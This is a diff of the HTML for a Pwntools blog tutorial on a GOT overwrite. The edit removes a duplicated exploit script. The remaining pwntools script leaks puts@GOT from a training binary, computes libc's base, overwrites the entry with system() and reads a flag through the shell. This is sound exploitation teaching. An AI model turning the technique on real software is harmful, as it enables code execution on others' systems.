@@ -1,4 +1,4 @@
-<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Simple GOT Overwrite - Pwntools Blog</title><meta name=description content="Exploiting a basic vulnerability involving a GOT overwrite"><meta name=author content="Team Gallopsled"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Pwntools Blog","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.pwntools.com\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","name":"Simple got overwrite"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"\u003ca href=\u0027https:\/\/twitter.com\/ebeip90\u0027\u003eebeip90\u003c\/a\u003e"},"headline":"Simple GOT Overwrite","description":"Modern Linux relies on a linker to match imported symbols to an external library, generally libc.so. The process of overwriting entries in the Global Offset Table (GOT) can easily lead to controlled code execution.\n","inLanguage":"en","wordCount":1802,"datePublished":"2021-02-23T20:22:21","dateModified":"2021-02-23T20:22:21","image":"https:\/\/blog.pwntools.com\/img\/logo.png","keywords":["got, aslr, easy, elf, libc"],"mainEntityOfPage":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","publisher":{"@type":"Organization","name":"https:\/\/blog.pwntools.com\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.pwntools.com\/img\/logo.png","height":60,"width":60}}}</script><meta property="og:title" content="Simple GOT Overwrite"><meta property="og:description" content="Exploiting a basic vulnerability involving a GOT overwrite"><meta property="og:image" content="https://blog.pwntools.com/img/logo.png"><meta property="og:url" content="https://blog.pwntools.com/posts/got-overwrite/"><meta property="og:type" content="website"><meta property="og:site_name" content="Pwntools Blog"><meta name=twitter:title content="Simple GOT Overwrite"><meta name=twitter:description content="Exploiting a basic vulnerability involving a GOT overwrite"><meta name=twitter:image content="https://blog.pwntools.com/img/logo.png"><meta name=twitter:card content="summary"><meta name=twitter:site content="@Pwntools"><meta name=twitter:creator content="@Pwntools"><meta name=generator content="Hugo 0.82.1"><link rel=alternate href=https://blog.pwntools.com/index.xml type=application/rss+xml title="Pwntools Blog"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.pwntools.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.pwntools.com/css/syntax.css><link rel=stylesheet href=https://blog.pwntools.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Simple GOT Overwrite - Pwntools Blog</title><meta name=description content="Exploiting a basic vulnerability involving a GOT overwrite"><meta name=author content="Team Gallopsled"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Pwntools Blog","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.pwntools.com\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","name":"Simple got overwrite"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"\u003ca href=\u0027https:\/\/twitter.com\/ebeip90\u0027\u003eebeip90\u003c\/a\u003e"},"headline":"Simple GOT Overwrite","description":"Modern Linux relies on a linker to match imported symbols to an external library, generally libc.so. The process of overwriting entries in the Global Offset Table (GOT) can easily lead to controlled code execution.\n","inLanguage":"en","wordCount":1658,"datePublished":"2021-02-23T20:22:21","dateModified":"2021-02-23T20:22:21","image":"https:\/\/blog.pwntools.com\/img\/logo.png","keywords":["got, aslr, easy, elf, libc"],"mainEntityOfPage":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","publisher":{"@type":"Organization","name":"https:\/\/blog.pwntools.com\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.pwntools.com\/img\/logo.png","height":60,"width":60}}}</script><meta property="og:title" content="Simple GOT Overwrite"><meta property="og:description" content="Exploiting a basic vulnerability involving a GOT overwrite"><meta property="og:image" content="https://blog.pwntools.com/img/logo.png"><meta property="og:url" content="https://blog.pwntools.com/posts/got-overwrite/"><meta property="og:type" content="website"><meta property="og:site_name" content="Pwntools Blog"><meta name=twitter:title content="Simple GOT Overwrite"><meta name=twitter:description content="Exploiting a basic vulnerability involving a GOT overwrite"><meta name=twitter:image content="https://blog.pwntools.com/img/logo.png"><meta name=twitter:card content="summary"><meta name=twitter:site content="@Pwntools"><meta name=twitter:creator content="@Pwntools"><meta name=generator content="Hugo 0.82.1"><link rel=alternate href=https://blog.pwntools.com/index.xml type=application/rss+xml title="Pwntools Blog"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.pwntools.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.pwntools.com/css/syntax.css><link rel=stylesheet href=https://blog.pwntools.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
 <span class=sr-only>Toggle navigation</span>
 <span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button>
 <a class=navbar-brand href=https://blog.pwntools.com/>Pwntools Blog</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Discord href=https://discord.gg/96VA2zvjCB>Discord</a></li><li><a title=Docs href=https://docs.pwntools.com>Docs</a></li><li><a title=Tutorials href=https://github.com/Gallopsled/pwntools-tutorial/blob/master/README.md>Tutorials</a></li><li><a href=#modalSearch data-toggle=modal data-target=#modalSearch style=outline:none><span class="hidden-sm hidden-md hidden-lg">Search</span> <span id=searchGlyph class="glyphicon glyphicon-search"></span></a></li></ul></div><div class=avatar-container><div class=avatar-img-border><a title="Pwntools Blog" href=https://blog.pwntools.com/><img class=avatar-img src=https://blog.pwntools.com/img/logo.png alt="Pwntools Blog"></a></div></div></div></nav><div id=modalSearch class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><button type=button class=close data-dismiss=modal>&#215;</button><h4 class=modal-title>Search Pwntools Blog</h4></div><div class=modal-body><gcse:search></gcse:search></div><div class=modal-footer><button type=button class="btn btn-default" data-dismiss=modal>Close</button></div></div></div></div><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
@@ -124,44 +124,6 @@
 </span><span class=lnt>35
 </span><span class=lnt>36
 </span><span class=lnt>37
-</span><span class=lnt>38
-</span><span class=lnt>39
-</span><span class=lnt>40
-</span><span class=lnt>41
-</span><span class=lnt>42
-</span><span class=lnt>43
-</span><span class=lnt>44
-</span><span class=lnt>45
-</span><span class=lnt>46
-</span><span class=lnt>47
-</span><span class=lnt>48
-</span><span class=lnt>49
-</span><span class=lnt>50
-</span><span class=lnt>51
-</span><span class=lnt>52
-</span><span class=lnt>53
-</span><span class=lnt>54
-</span><span class=lnt>55
-</span><span class=lnt>56
-</span><span class=lnt>57
-</span><span class=lnt>58
-</span><span class=lnt>59
-</span><span class=lnt>60
-</span><span class=lnt>61
-</span><span class=lnt>62
-</span><span class=lnt>63
-</span><span class=lnt>64
-</span><span class=lnt>65
-</span><span class=lnt>66
-</span><span class=lnt>67
-</span><span class=lnt>68
-</span><span class=lnt>69
-</span><span class=lnt>70
-</span><span class=lnt>71
-</span><span class=lnt>72
-</span><span class=lnt>73
-</span><span class=lnt>74
-</span><span class=lnt>75
 </span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>e</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;got&#39;</span><span class=p>)</span>
@@ -199,44 +161,6 @@
 <span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
 <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;cat flag.txt&#39;</span><span class=p>)</span>
 <span class=n>success</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>())</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-
-<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>e</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;got&#39;</span><span class=p>)</span>
-
-<span class=k>print</span><span class=p>(</span><span class=s2>&#34;puts@got is at &#34;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>))</span>
-
-<span class=c1># Start the process</span>
-<span class=n>io</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
-<span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
-
-<span class=c1># We have 28 bytes, and 4 of them will be dumped</span>
-<span class=n>io</span><span class=o>.</span><span class=n>fit</span><span class=p>({</span>
-	<span class=mi>0</span><span class=p>:</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span>
-	<span class=mi>24</span><span class=p>:</span> <span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span>
-<span class=p>})</span>
-
-<span class=c1># Receive data until we get the open colon</span>
-<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;(&#34;</span><span class=p>)</span>
-
-<span class=c1># Receive exactly four bytes of leaked data</span>
-<span class=n>got_puts</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>unpack</span><span class=p>()</span>
-<span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts@GOT == </span><span class=si>%#x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>got_puts</span><span class=p>)</span>
-<span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
-
-<span class=c1># Calculate the base address of libc so we can calculate system()</span>
-<span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>libc</span>
-<span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>got_puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>puts</span>
-<span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc == </span><span class=si>%#x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
-
-<span class=c1># Calculate system()</span>
-<span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>system</span>
-<span class=n>io</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=n>system</span><span class=p>)</span>
-
-<span class=c1># Get a shell</span>
-<span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
-<span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;cat flag.txt&#39;</span><span class=p>)</span>
-<span class=n>success</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>())</span>
-
 </code></pre></td></tr></table></div></div></details><p>Next the script starts the target process, and clears any existing output. Since the binary is not position-independent (does not use ASLR), the <em>location</em> of the <code>puts</code> pointer is known ahead of time, and can be automatically calculated by using <code>ELF.got.puts</code>.</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>e</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;got&#39;</span><span class=p>)</span>
